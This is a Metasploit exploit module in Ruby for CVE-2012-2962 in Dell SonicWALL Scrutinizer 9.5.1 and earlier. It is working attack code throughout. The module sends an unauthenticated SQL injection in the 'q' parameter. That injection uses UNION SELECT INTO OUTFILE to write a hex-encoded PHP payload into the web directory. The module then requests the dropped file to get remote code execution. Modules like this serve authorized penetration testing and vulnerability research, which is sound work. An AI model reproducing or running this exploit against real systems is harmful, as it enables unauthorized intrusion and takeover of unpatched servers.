##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Dell SonicWALL Scrutinizer 9 SQL Injection",
      'Description'    => %q{
          This module exploits a vulnerability found in Dell SonicWall Scrutinizer.
        While handling the 'q' parameter, the PHP application does not properly filter
        the user-supplied data, which can be manipulated to inject SQL commands, and
        then gain remote code execution.  Please note that authentication is NOT needed
        to exploit this vulnerability.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'muts',
          'Devon Kearns',
          'sinn3r'
        ],
      'References'     =>
        [
          ['CVE', '2012-2962'],
          ['OSVDB', '84232'],
          ['EDB', '20033'],
          ['BID', '54625'],
          ['URL', 'http://www.sonicwall.com/shared/download/Dell_SonicWALL_Scrutinizer_Service_Bulletin_for_SQL_injection_vulnerability_CVE.pdf']
        ],
      'Payload'        =>
        {
          'BadChars' => "\x00"
        },
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Targets'        =>
        [
          # According to advisory, version 9.5.1 and before are vulnerable.
          # But was only able to test this on 9.0.1.0
          ['Dell SonicWall Scrutinizer 9.5.1 or older', {}]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Jul 22 2012",
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('TARGETURI', [true, 'The path to the SonicWall Scrutinizer\'s statusFilter file', '/d4d/statusFilter.php']),
          OptString.new('HTMLDIR',   [true, 'The HTML root directory for the web application', 'C:\\Program Files\\Scrutinizer\\html\\'])
        ], self.class)
  end


  def check
    res = send_request_raw({'uri'=>target_uri.host})
    if res and res.body =~ /\<title\>Scrutinizer\<\/title\>/ and
               res.body =~ /\<div id\=\'.+\'\>Scrutinizer 9\.[0-5]\.[0-1]\<\/div\>/
      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe
  end


  def exploit
    peer = "#{rhost}:#{rport}"
    p = "<?php #{payload.encoded} ?>"
    hex_payload = p.unpack("H*")[0]
    php_fname   = Rex::Text.rand_text_alpha(5) + ".php"
    rnd_txt     = Rex::Text.rand_text_alpha_upper(3)

    print_status("#{peer} - Sending SQL injection...")
    res = send_request_cgi({
      'uri'       => target_uri.path,
      'method'    => 'POST',
      'vars_post' => {
        'commonJson' => 'protList',
        'q' => "#{rnd_txt}' union select 0x#{hex_payload},0 into outfile '../../html/d4d/#{php_fname}'#"
      }
    })

    if res and res.body !~ /No Results Found/
      print_error("#{peer} - I don't think the SQL Injection attempt worked")
      return
    elsif not res
      print_error("#{peer} - No response from the server")
      return
    end

    # For debugging purposes, this is useful
    vprint_status(res.to_s)

    target_path = "#{File.dirname(target_uri.path)}/#{php_fname}"
    print_status("#{peer} - Requesting: #{target_path}")
    send_request_raw({'uri' => target_path})

    handler
  end
end